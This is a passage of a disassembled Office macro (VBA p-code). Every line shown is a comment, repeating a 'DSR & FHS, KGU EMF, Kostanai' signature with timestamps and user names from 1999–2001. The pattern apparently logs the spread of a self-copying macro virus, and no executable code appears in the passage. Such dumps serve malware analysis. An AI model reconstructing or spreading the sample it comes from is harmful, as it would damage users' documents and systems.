' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #467:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #468:
' 	QuoteRem 0x0000 0x0020 " 19:24:05 - суббота, 15 июл 2000"
' Line #469:
' 	QuoteRem 0x0000 0x0007 " Klient"
' Line #470:
' 	QuoteRem 0x0000 0x0000 ""
' Line #471:
' Line #472:
' Line #473:
' Line #474:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #475:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #476:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #477:
' 	QuoteRem 0x0000 0x001F " 12:55:48 - вторник, 1 авг 2000"
' Line #478:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #479:
' 	QuoteRem 0x0000 0x0000 ""
' Line #480:
' Line #481:
' Line #482:
' Line #483:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #484:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #485:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #486:
' 	QuoteRem 0x0000 0x001F " 12:56:52 - вторник, 1 авг 2000"
' Line #487:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #488:
' 	QuoteRem 0x0000 0x0000 ""
' Line #489:
' Line #490:
' Line #491:
' Line #492:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #493:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #494:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #495:
' 	QuoteRem 0x0000 0x001F " 11:10:00 - четверг, 3 авг 2000"
' Line #496:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #497:
' 	QuoteRem 0x0000 0x0000 ""
' Line #498:
' Line #499:
' Line #500:
' Line #501:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #502:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #503:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #504:
' 	QuoteRem 0x0000 0x001F " 15:22:04 - четверг, 3 авг 2000"
' Line #505:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #506:
' 	QuoteRem 0x0000 0x0000 ""
' Line #507:
' Line #508:
' Line #509:
' Line #510:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #511:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #512:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #513:
' 	QuoteRem 0x0000 0x0020 " 17:55:33 - четверг, 10 авг 2000"
' Line #514:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #515:
' 	QuoteRem 0x0000 0x0000 ""
' Line #516:
' Line #517:
' Line #518:
' Line #519:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #520:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #521:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #522:
' 	QuoteRem 0x0000 0x0020 " 17:57:07 - четверг, 10 авг 2000"
' Line #523:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #524:
' 	QuoteRem 0x0000 0x0000 ""
' Line #525:
' Line #526:
' Line #527:
' Line #528:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #529:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #530:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #531:
' 	QuoteRem 0x0000 0x0020 " 12:19:38 - пятница, 11 авг 2000"
' Line #532:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #533:
' 	QuoteRem 0x0000 0x0000 ""
' Line #534:
' Line #535:
' Line #536:
' Line #537:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #538:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #539:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #540:
' 	QuoteRem 0x0000 0x0020 " 12:23:41 - пятница, 11 авг 2000"
' Line #541:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #542:
' 	QuoteRem 0x0000 0x0000 ""
' Line #543:
' Line #544:
' Line #545:
' Line #546:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #547:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #548:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #549:
' 	QuoteRem 0x0000 0x0020 " 13:42:42 - пятница, 11 авг 2000"
' Line #550:
' 	QuoteRem 0x0000 0x000D " Ермаков В.А."
' Line #551:
' 	QuoteRem 0x0000 0x0000 ""
' Line #552:
' Line #553:
' Line #554:
' Line #555:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #556:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #557:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #558:
' 	QuoteRem 0x0000 0x0020 " 18:18:14 - вторник, 26 сен 2000"
' Line #559:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #560:
' 	QuoteRem 0x0000 0x0000 ""
' Line #561:
' Line #562:
' Line #563:
' Line #564:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #565:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #566:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #567:
' 	QuoteRem 0x0000 0x0020 " 15:57:13 - четверг, 28 сен 2000"
' Line #568:
' 	QuoteRem 0x0000 0x0005 " User"
' Line #569:
' 	QuoteRem 0x0000 0x0000 ""
' Line #570:
' Line #571:
' Line #572:
' Line #573:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #574:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #575:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #576:
' 	QuoteRem 0x0000 0x0020 " 17:41:44 - четверг, 28 сен 2000"
' Line #577:
' 	QuoteRem 0x0000 0x0013 " Compaq Distributor"
' Line #578:
' 	QuoteRem 0x0000 0x0000 ""
' Line #579:
' Line #580:
' Line #581:
' Line #582:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #583:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #584:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #585:
' 	QuoteRem 0x0000 0x001F " 19:24:45 - Monday, 23 Oct 2000"
' Line #586:
' 	QuoteRem 0x0000 0x0007 " Fatima"
' Line #587:
' 	QuoteRem 0x0000 0x0000 ""
' Line #588:
' Line #589:
' Line #590:
' Line #591:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #592:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #593:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #594:
' 	QuoteRem 0x0000 0x0020 " 10:41:01 - четверг, 26 окт 2000"
' Line #595:
' 	QuoteRem 0x0000 0x0005 " Oleg"
' Line #596:
' 	QuoteRem 0x0000 0x0000 ""
' Line #597:
' Line #598:
' Line #599:
' Line #600:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #601:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #602:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #603:
' 	QuoteRem 0x0000 0x0020 " 19:43:56 - четверг, 26 окт 2000"
' Line #604:
' 	QuoteRem 0x0000 0x0005 " Oleg"
' Line #605:
' 	QuoteRem 0x0000 0x0000 ""
' Line #606:
' Line #607:
' Line #608:
' Line #609:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #610:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #611:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #612:
' 	QuoteRem 0x0000 0x0020 " 14:58:56 - суббота, 28 окт 2000"
' Line #613:
' 	QuoteRem 0x0000 0x0002 " *"
' Line #614:
' 	QuoteRem 0x0000 0x0000 ""
' Line #615:
' Line #616:
' Line #617:
' Line #618:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #619:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #620:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #621:
' 	QuoteRem 0x0000 0x0020 " 11:00:04 - пятница, 10 ноя 2000"
' Line #622:
' 	QuoteRem 0x0000 0x0005 " Olga"
' Line #623:
' 	QuoteRem 0x0000 0x0000 ""
' Line #624:
' Line #625:
' Line #626:
' Line #627:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #628:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #629:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #630:
' 	QuoteRem 0x0000 0x0020 " 11:44:49 - пятница, 10 ноя 2000"
' Line #631:
' 	QuoteRem 0x0000 0x0005 " Olga"
' Line #632:
' 	QuoteRem 0x0000 0x0000 ""
' Line #633:
' Line #634:
' Line #635:
' Line #636:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #637:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #638:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #639:
' 	QuoteRem 0x0000 0x0020 " 15:43:30 - четверг, 14 дек 2000"
' Line #640:
' 	QuoteRem 0x0000 0x0005 " Olga"
' Line #641:
' 	QuoteRem 0x0000 0x0000 ""
' Line #642:
' Line #643:
' Line #644:
' Line #645:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #646:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #647:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #648:
' 	QuoteRem 0x0000 0x0023 " 03:17:45 - понедельник, 7 Фев 2000"
' Line #649:
' 	QuoteRem 0x0000 0x0004 " GEZ"
' Line #650:
' 	QuoteRem 0x0000 0x0000 ""
' Line #651:
' Line #652:
' Line #653:
' Line #654:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #655:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #656:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #657:
' 	QuoteRem 0x0000 0x001E " 03:30:27 - среда, 16 Фев 2000"
' Line #658:
' 	QuoteRem 0x0000 0x0004 " GEZ"
' Line #659:
' 	QuoteRem 0x0000 0x0000 ""
' Line #660:
' Line #661:
' Line #662:
' Line #663:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #664:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #665:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #666:
' 	QuoteRem 0x0000 0x001E " 04:50:10 - среда, 16 Фев 2000"
' Line #667:
' 	QuoteRem 0x0000 0x0004 " GEZ"
' Line #668:
' 	QuoteRem 0x0000 0x0000 ""
' Line #669:
' Line #670:
' Line #671:
' Line #672:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #673:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #674:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #675:
' 	QuoteRem 0x0000 0x001E " 15:41:03 - среда, 15 Мар 2000"
' Line #676:
' 	QuoteRem 0x0000 0x0004 " GEZ"
' Line #677:
' 	QuoteRem 0x0000 0x0000 ""
' Line #678:
' Line #679:
' Line #680:
' Line #681:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #682:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #683:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #684:
' 	QuoteRem 0x0000 0x001F " 17:48:43 - четверг, 3 май 2001"
' Line #685:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #686:
' 	QuoteRem 0x0000 0x0000 ""
' Line #687:
' Line #688:
' Line #689:
' Line #690:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #691:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #692:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #693:
' 	QuoteRem 0x0000 0x0020 " 16:11:43 - вторник, 22 май 2001"
' Line #694:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #695:
' 	QuoteRem 0x0000 0x0000 ""
' Line #696:
' Line #697:
' Line #698:
' Line #699:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #700:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #701:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #702:
' 	QuoteRem 0x0000 0x0020 " 17:30:43 - четверг, 31 май 2001"
' Line #703:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #704:
' 	QuoteRem 0x0000 0x0000 ""
' Line #705:
' Line #706:
' Line #707:
' Line #708:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #709:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #710:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #711:
' 	QuoteRem 0x0000 0x001F " 10:23:13 - суббота, 7 июл 2001"
' Line #712:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #713:
' 	QuoteRem 0x0000 0x0000 ""
' Line #714:
' Line #715:
' Line #716:
' Line #717:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #718:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #719:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #720:
' 	QuoteRem 0x0000 0x001E " 11:45:17 - среда, 11 июл 2001"
' Line #721:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #722:
' 	QuoteRem 0x0000 0x0000 ""
' Line #723:
' Line #724:
' Line #725:
' Line #726:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #727:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #728:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #729:
' 	QuoteRem 0x0000 0x0020 " 14:57:06 - четверг, 12 июл 2001"
' Line #730:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #731:
' 	QuoteRem 0x0000 0x0000 ""
' Line #732:
' Line #733:
' Line #734:
' Line #735:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #736:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #737:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #738:
' 	QuoteRem 0x0000 0x0020 " 16:21:16 - вторник, 14 авг 2001"
' Line #739:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #740:
' 	QuoteRem 0x0000 0x0000 ""
' Line #741:
' Line #742:
' Line #743:
' Line #744:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #745:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #746:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #747:
' 	QuoteRem 0x0000 0x001E " 11:28:21 - среда, 15 авг 2001"
' Line #748:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #749:
' 	QuoteRem 0x0000 0x0000 ""
' Line #750:
' Line #751:
' Line #752:
' Line #753:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #754:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #755:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #756:
' 	QuoteRem 0x0000 0x001E " 11:31:56 - среда, 15 авг 2001"
' Line #757:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #758:
' 	QuoteRem 0x0000 0x0000 ""
' Line #759:
' Line #760:
' Line #761:
' Line #762:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #763:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #764:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #765:
' 	QuoteRem 0x0000 0x0020 " 11:36:33 - вторник, 21 авг 2001"
' Line #766:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #767:
' 	QuoteRem 0x0000 0x0000 ""
' Line #768:
' Line #769:
' Line #770:
' Line #771:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #772:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #773:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #774:
' 	QuoteRem 0x0000 0x0020 " 13:29:07 - четверг, 23 авг 2001"
' Line #775:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #776:
' 	QuoteRem 0x0000 0x0000 ""
' Line #777:
' Line #778:
' Line #779:
' Line #780:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #781:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #782:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #783:
' 	QuoteRem 0x0000 0x0024 " 10:34:12 - понедельник, 19 ноя 2001"
' Line #784:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #785:
' 	QuoteRem 0x0000 0x0000 ""
' Line #786:
' Line #787:
' Line #788:
' Line #789:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #790:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #791:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #792:
' 	QuoteRem 0x0000 0x0024 " 10:41:25 - понедельник, 19 ноя 2001"
' Line #793:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #794:
' 	QuoteRem 0x0000 0x0000 ""
' Line #795:
' Line #796:
' Line #797:
' Line #798:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #799:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #800:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #801:
' 	QuoteRem 0x0000 0x0024 " 10:42:17 - понедельник, 19 ноя 2001"
' Line #802:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #803:
' 	QuoteRem 0x0000 0x0000 ""
' Line #804:
' Line #805:
' Line #806:
' Line #807:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #808:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #809:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #810:
' 	QuoteRem 0x0000 0x0024 " 13:23:53 - понедельник, 19 ноя 2001"
' Line #811:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #812:
' 	QuoteRem 0x0000 0x0000 ""
' Line #813:
' Line #814:
' Line #815:
' Line #816:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #817:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #818:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #819:
' 	QuoteRem 0x0000 0x0024 " 13:26:27 - понедельник, 19 ноя 2001"
' Line #820:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #821:
' 	QuoteRem 0x0000 0x0000 ""
' Line #822:
' Line #823:
' Line #824:
' Line #825:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #826:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #827:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #828:
' 	QuoteRem 0x0000 0x0024 " 13:29:18 - понедельник, 19 ноя 2001"
' Line #829:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #830:
' 	QuoteRem 0x0000 0x0000 ""
' Line #831:
' Line #832:
' Line #833:
' Line #834:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #835:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #836:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #837:
' 	QuoteRem 0x0000 0x0024 " 13:42:38 - понедельник, 19 ноя 2001"
' Line #838:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #839:
' 	QuoteRem 0x0000 0x0000 ""
' Line #840:
' Line #841:
' Line #842:
' Line #843:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #844:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #845:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #846:
' 	QuoteRem 0x0000 0x0024 " 13:45:45 - понедельник, 19 ноя 2001"
' Line #847:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #848:
' 	QuoteRem 0x0000 0x0000 ""
' Line #849:
' Line #850:
' Line #851:
' Line #852:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #853:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #854:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #855:
' 	QuoteRem 0x0000 0x0020 " 16:34:43 - вторник, 27 ноя 2001"
' Line #856:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #857:
' 	QuoteRem 0x0000 0x0000 ""
' Line #858:
' Line #859:
' Line #860:
' Line #861:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #862:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #863:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #864:
' 	QuoteRem 0x0000 0x0020 " 10:46:37 - четверг, 29 ноя 2001"
' Line #865:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #866:
' 	QuoteRem 0x0000 0x0000 ""
' Line #867:
' Line #868:
' Line #869:
' Line #870:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #871:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #872:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #873:
' 	QuoteRem 0x0000 0x0020 " 10:48:19 - четверг, 29 ноя 2001"
' Line #874:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #875:
' 	QuoteRem 0x0000 0x0000 ""
' Line #876:
' Line #877:
' Line #878:
' Line #879:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #880:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #881:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #882:
' 	QuoteRem 0x0000 0x0020 " 10:50:30 - четверг, 29 ноя 2001"
' Line #883:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #884:
' 	QuoteRem 0x0000 0x0000 ""
' Line #885:
' Line #886:
' Line #887:
' Line #888:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #889:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #890:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #891:
' 	QuoteRem 0x0000 0x0020 " 10:53:31 - четверг, 29 ноя 2001"
' Line #892:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #893:
' 	QuoteRem 0x0000 0x0000 ""
' Line #894:
' Line #895:
' Line #896:
' Line #897:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #898:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #899:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #900:
' 	QuoteRem 0x0000 0x0020 " 10:56:48 - четверг, 29 ноя 2001"
' Line #901:
' 	QuoteRem 0x0000 0x0006 " Polaz"
' Line #902:
' 	QuoteRem 0x0000 0x0000 ""
' Line #903:
' Line #904:
' Line #905:
' Line #906:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #907:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #908:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #909:
' 	QuoteRem 0x0000 0x0023 " 11:13:12 - ceturtdiena, 6 Dec 2001"
' Line #910:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #911:
' 	QuoteRem 0x0000 0x0000 ""
' Line #912:
' Line #913:
' Line #914:
' Line #915:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #916:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #917:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #918:
' 	QuoteRem 0x0000 0x0022 " 11:32:21 - pirmdiena, 17 Dec 2001"
' Line #919:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #920:
' 	QuoteRem 0x0000 0x0000 ""
' Line #921:
' Line #922:
' Line #923:
' Line #924:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #925:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #926:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #927:
' 	QuoteRem 0x0000 0x0021 " 10:52:49 - otrdiena, 18 Dec 2001"
' Line #928:
' 	QuoteRem 0x0000 0x0010 " Ship Management"
' Line #929:
' 	QuoteRem 0x0000 0x0000 ""
' Line #930:
' Line #931:
' Line #932:
' Line #933:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #934:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #935:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #936:
' 	QuoteRem 0x0000 0x0021 " 10:58:44 - otrdiena, 18 Dec 2001"
